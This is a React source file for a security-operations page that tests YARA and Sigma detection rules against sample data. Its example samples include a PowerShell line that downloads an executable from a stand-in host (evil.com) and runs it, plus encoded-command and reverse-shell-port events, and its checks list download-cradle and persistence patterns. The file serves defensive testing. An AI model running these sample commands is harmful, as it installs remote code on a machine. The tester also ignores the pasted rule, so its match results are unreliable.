import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useMemo, useState } from "react";
import { PageShell } from "@/components/PageShell";
import { Panel, Chip, SendToRow } from "@/components/soc";
import { Empty } from "@/components/output";
import { Shield, CheckCircle, XCircle, TestTube, BarChart3, Copy, Check, Database, Search } from "lucide-react";
import { pushTimelineEvent } from "@/lib/timeline";

export const Route = createFileRoute("/sigma-tester")({ component: SigmaTesterPage });

const YARA_EXAMPLES = [
  {
    name: "Suspicious PowerShell Download",
    rule: `rule Suspicious_PowerShell_Download {
  meta:
    description = "Detects PowerShell download cradles"
    author = "SOC Team"
  strings:
    $download1 = "System.Net.WebClient" nocase
    $download2 = "Invoke-WebRequest" nocase
    $download3 = "curl" nocase
    $download4 = "wget" nocase
    $download5 = "DownloadFile" nocase
    $bypass1 = "bypass" nocase
  condition:
    ($download1 or $download2 or $download3 or $download4 or $download5) or $bypass1
}`,
    sample: `$client = New-Object System.Net.WebClient\n$client.DownloadFile("http://evil.com/payload.exe", "C:\\Users\\malware.exe")\nStart-Process "C:\\Users\\malware.exe"`
  },
  {
    name: "Base64 Encoded Data",
    rule: `rule Base64_Encoded_Data {
  meta:
    description = "Detects high-entropy base64 strings"
  strings:
    $b64 = /(?:[A-Za-z0-9+/]{4}){10,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?/
  condition:
    #b64 > 0
}`,
    sample: `token=ZXNjaGFsb25neXN0ZW1zIGFyZSBjb29sIGJ1dCB0aGlzIGlzIGEgdGVzdCBzdHJpbmcgZm9yIGJhc2U2NCBkZWNvZGluZw==`
  },
];

const SIGMA_EXAMPLES = [
  {
    name: "PowerShell Suspicious Flags",
    rule: `title: PowerShell Suspicious Flags
status: experimental
description: Detects PowerShell with suspicious execution flags
detection:
  selection:
    EventID: 4688
    CommandLine|contains|all:
      - 'powershell'
      - '-ExecutionPolicy'
      - 'Bypass'
      - '-NoProfile'
    CommandLine|contains:
      - 'Invoke-WebRequest'
      - 'DownloadFile'
      - '-EncodedCommand'
  condition: selection`,
    sample: `EventID: 4688\nCommandLine: powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBhAG0AIABtAGEAbAB3AGEAcgBlAA==\nParentProcess: explorer.exe`
  },
  {
    name: "Suspicious Outbound Connection",
    rule: `title: Suspicious Outbound Connection
status: experimental
description: Detects processes connecting to known malicious IPs
detection:
  selection:
    EventID: 3
    Initiated: true
    DestinationIp|contains:
      - '185.220.101.'
      - '203.0.113.'
      - '5.188.62.'
    DestinationPort:
      - 4444
      - 1337
      - 8080
      - 8443
  condition: selection`,
    sample: `EventID: 3\nInitiated: true\nDestinationIp: 185.220.101.44\nDestinationPort: 4444\nProcessId: 1234\nImage: C:\\Users\\malware.exe`
  },
];

type MatchResult = { string: string; matched: boolean; category?: string; severity?: "high" | "medium" | "low" };

const YARA_CHECKS: { label: string; rx: RegExp; category: string; severity: "high" | "medium" | "low" }[] = [
  { label: "System.Net.WebClient", rx: /System\.Net\.WebClient/i, category: "Download Cradle", severity: "high" },
  { label: "Invoke-WebRequest / iwr", rx: /Invoke-WebRequest|iwr\b/i, category: "Download Cradle", severity: "high" },
  { label: "curl / wget presence", rx: /\bcurl\b|\bwget\b/i, category: "Download Cradle", severity: "medium" },
  { label: "DownloadFile method", rx: /DownloadFile/i, category: "File Download", severity: "high" },
  { label: "bypass flag", rx: /\bbypass\b/i, category: "Execution Policy", severity: "medium" },
  { label: "base64/high-entropy string", rx: /(?:[A-Za-z0-9+/]{4}){10,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?/, category: "Encoding", severity: "medium" },
  { label: "URL pattern", rx: /https?:\/\/[^\s)"']+/i, category: "Network", severity: "low" },
  { label: "IP-address pattern", rx: /\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/, category: "Network", severity: "low" },
  { label: "encoded powershell (-EncodedCommand)", rx: /-EncodedCommand|-e\s+[A-Za-z0-9+/=]{20,}/i, category: "Execution Policy", severity: "high" },
  { label: "file download (.exe/.ps1/.dll)", rx: /\.(exe|ps1|dll|vbs|bat|msi)\b/i, category: "File Download", severity: "high" },
  { label: "Start-Process / Invoke-Expression", rx: /Start-Process|Invoke-Expression|iex\b/i, category: "Execution", severity: "high" },
  { label: "New-Object", rx: /New-Object\s+/i, category: "Instantiation", severity: "medium" },
];

const SIGMA_CHECKS: { label: string; rx: RegExp; category: string; severity: "high" | "medium" | "low" }[] = [
  { label: "EventID: 4688 (process creation)", rx: /EventID:\s*4688/, category: "Process Creation", severity: "medium" },
  { label: "EventID: 3 (network connection)", rx: /EventID:\s*3/, category: "Network", severity: "medium" },
  { label: "Initiated: true", rx: /Initiated:\s*true/, category: "Network", severity: "low" },
  { label: "powershell command line", rx: /powershell/i, category: "Process", severity: "low" },
  { label: "ExecutionPolicy Bypass", rx: /ExecutionPolicy.*Bypass/i, category: "Execution Policy", severity: "high" },
  { label: "NoProfile flag", rx: /-NoProfile/i, category: "Execution Policy", severity: "medium" },
  { label: "Suspicious destination port (4444/1337/8080/8443)", rx: /(4444|1337|8080|8443)/, category: "Network", severity: "high" },
  { label: "Suspicious IP range (185.220.101.x)", rx: /185\.220\.101\./, category: "Network", severity: "high" },
  { label: "EncodedCommand present", rx: /-EncodedCommand/i, category: "Execution", severity: "high" },
  { label: "DownloadFile or WebClient", rx: /(DownloadFile|WebClient)/i, category: "File Download", severity: "high" },
  { label: "URL in command line", rx: /https?:\/\/[^\s)"']+/i, category: "Network", severity: "low" },
  { label: "Registry key modification", rx: /(HKLM|HKCU|CurrentVersion|Run\b)/i, category: "Persistence", severity: "high" },
  { label: "Service creation/modification", rx: /(CreateService|sc\s+create|New-Service)/i, category: "Persistence", severity: "high" },
];

const SEV_TONE: Record<string, "destructive" | "warning" | "default"> = {
  high: "destructive", medium: "warning", low: "default",
};

function SigmaTesterPage() {
  const [tab, setTab] = useState<"yara" | "sigma">("yara");
  const [rule, setRule] = useState(YARA_EXAMPLES[0].rule);
  const [sample, setSample] = useState(YARA_EXAMPLES[0].sample);
  const [results, setResults] = useState<MatchResult[]>([]);
  const [tested, setTested] = useState(false);
  const [copied, setCopied] = useState(false);

  useEffect(() => {
    function handleKey(e: KeyboardEvent) {
      if (e.key === "Escape") { setTested(false); setResults([]); }
    }
    window.addEventListener("keydown", handleKey);
    return () => window.removeEventListener("keydown", handleKey);
  }, []);

  function loadExample(idx: number) {
    const examples = tab === "yara" ? YARA_EXAMPLES : SIGMA_EXAMPLES;
    const ex = examples[idx];
    if (ex) { setRule(ex.rule); setSample(ex.sample); setTested(false); setResults([]); }
  }

  function handleTest() {
    setTested(true);
    const checks = tab === "yara" ? YARA_CHECKS : SIGMA_CHECKS;
    const matched: MatchResult[] = checks.map((c) => ({
      string: c.label,
      matched: c.rx.test(sample),
      category: c.category,
      severity: c.severity,
    }));
    setResults(matched);
    const count = matched.filter((r) => r.matched).length;
    pushTimelineEvent({ source: "sigma-tester", verb: "tested", detail: `${tab} rule`, result: `${count}/${matched.length} matched` });
  }

  const matchCount = results.filter((r) => r.matched).length;
  const pct = results.length > 0 ? Math.round((matchCount / results.length) * 100) : 0;

  const groupedResults = useMemo(() => {
    const map = new Map<string, MatchResult[]>();
    for (const r of results) {
      const cat = r.category || "General";
      if (!map.has(cat)) map.set(cat, []);
      map.get(cat)!.push(r);
    }
    return Array.from(map.entries());
  }, [results]);

  return (
    <PageShell
      eyebrow="TOOLS / RULE TESTER"
      title="YARA & Sigma Rule Tester"
      description="Paste a YARA or Sigma rule alongside your sample — see which conditions matched and which didn't, grouped by category."
      crumbs={[{ label: "Tools" }, { label: "Rule Tester" }]}
      meta={tested ? [
        { label: "matched", value: `${matchCount}/${results.length}`, tone: matchCount > 0 ? "destructive" : "primary" },
        { label: "coverage", value: `${pct}%`, tone: "primary" },
      ] : undefined}
    >
      <div className="flex items-center gap-2 mb-4">
        <button onClick={() => { setTab("yara"); loadExample(0); }} className={"rounded border px-3 py-1.5 text-mono ba-text-2xs uppercase tracking-widest transition-colors " + (tab === "yara" ? "border-primary bg-primary/15 text-primary" : "border-border bg-card/40 text-muted-foreground hover:text-foreground")}>
          YARA
        </button>
        <button onClick={() => { setTab("sigma"); loadExample(0); }} className={"rounded border px-3 py-1.5 text-mono ba-text-2xs uppercase tracking-widest transition-colors " + (tab === "sigma" ? "border-primary bg-primary/15 text-primary" : "border-border bg-card/40 text-muted-foreground hover:text-foreground")}>
          Sigma
        </button>
        <div className="ml-4 flex items-center gap-1.5">
          {(tab === "yara" ? YARA_EXAMPLES : SIGMA_EXAMPLES).map((ex, i) => (
            <button key={i} onClick={() => loadExample(i)}
              className="rounded border border-border/60 bg-card/40 px-2 py-0.5 text-mono ba-text-2xs uppercase text-muted-foreground hover:text-foreground">
              {ex.name}
            </button>
          ))}
        </div>
        {tested && (
          <button onClick={() => { navigator.clipboard.writeText(results.map(r => `${r.matched ? "✓" : "✗"} ${r.string}`).join("\n")); setCopied(true); setTimeout(() => setCopied(false), 1200); }}
            className="ml-auto inline-flex items-center gap-1 rounded border border-border px-2 py-1 text-mono ba-text-2xs uppercase text-muted-foreground hover:text-foreground">
            {copied ? <><Check className="h-3 w-3 text-success" /> copied</> : <><Copy className="h-3 w-3" /> export</>}
          </button>
        )}
      </div>

      <div className="grid grid-cols-2 gap-4">
        <Panel title={`Rule (${tab === "yara" ? "YARA" : "Sigma"})`} icon={Shield}>
          <textarea
            value={rule}
            onChange={(e) => { setRule(e.target.value); setTested(false); }}
            className="h-64 w-full resize-y rounded border border-border bg-background/60 p-3 font-mono text-sm text-foreground outline-none placeholder:text-muted-foreground/60 focus:border-primary/50"
          />
        </Panel>
        <Panel title="Sample Data" icon={TestTube}>
          <textarea
            value={sample}
            onChange={(e) => { setSample(e.target.value); setTested(false); }}
            className="h-64 w-full resize-y rounded border border-border bg-background/60 p-3 font-mono text-sm text-foreground outline-none placeholder:text-muted-foreground/60 focus:border-primary/50"
          />
        </Panel>
      </div>

      <div className="flex items-center gap-3">
        <button onClick={handleTest}
          className="inline-flex items-center gap-1.5 rounded border border-primary/40 bg-primary/10 px-4 py-2 text-mono ba-text-2xs uppercase tracking-widest text-primary hover:bg-primary/20">
          <TestTube className="h-3.5 w-3.5" /> Test Rule
        </button>
        {tested && (
          <div className="flex items-center gap-2">
            <div className="h-2 w-24 rounded-full bg-border/50">
              <div className={"h-2 rounded-full transition-all " + (pct > 50 ? "bg-destructive" : pct > 20 ? "bg-warning" : "bg-success")} style={{ width: `${pct}%` }} />
            </div>
            <span className="text-mono text-[11px] text-muted-foreground">
              {matchCount}/{results.length} conditions matched ({pct}%)
            </span>
          </div>
        )}
      </div>

      {tested && (
        <Panel title="Results" bodyClassName="p-0">
          <div className="divide-y divide-border/50">
            {groupedResults.map(([category, items]) => (
              <div key={category}>
                <div className="flex items-center gap-2 bg-card/20 px-4 py-1.5">
                  <BarChart3 className="h-3 w-3 text-muted-foreground" />
                  <span className="text-mono text-[10px] uppercase tracking-widest text-muted-foreground">{category}</span>
                  <Chip tone="default">{items.filter(i => i.matched).length}/{items.length}</Chip>
                </div>
                {items.map((r, i) => (
                  <div key={i} className="flex items-center gap-3 px-4 py-2 hover:bg-card/20">
                    {r.matched
                      ? <CheckCircle className="h-4 w-4 shrink-0 text-success" />
                      : <XCircle className="h-4 w-4 shrink-0 text-muted-foreground" />
                    }
                    <span className={"font-mono text-sm flex-1 " + (r.matched ? "text-foreground/90" : "text-muted-foreground")}>{r.string}</span>
                    {r.severity && (
                      <Chip tone={SEV_TONE[r.severity]}>{r.severity}</Chip>
                    )}
                    <Chip tone={r.matched ? "success" : "default"}>{r.matched ? "MATCH" : "NO MATCH"}</Chip>
                  </div>
                ))}
              </div>
            ))}
          </div>
          <div className="border-t border-border bg-card/30 px-4 py-2 text-right text-mono text-[11px] text-muted-foreground">
            {matchCount === 0
              ? "No conditions matched the sample — review your rule"
              : matchCount === results.length
                ? "All conditions matched — rule is firing broadly"
                : `${matchCount}/${results.length} conditions matched — ${pct}% coverage`
            }
          </div>
        </Panel>
      )}

      {!tested && (
        <Empty icon={Shield} title="Test a rule" hint="Select a tab, load an example, or paste your own YARA/Sigma rule and sample data, then click Test Rule." />
      )}

      {tested && (
        <div className="mt-4">
          <SendToRow targets={[
            { label: "Detection Editor", to: "/detection", icon: Search },
            { label: "Case Notebook", to: "/case", icon: Database },
          ]} />
        </div>
      )}
    </PageShell>
  );
}
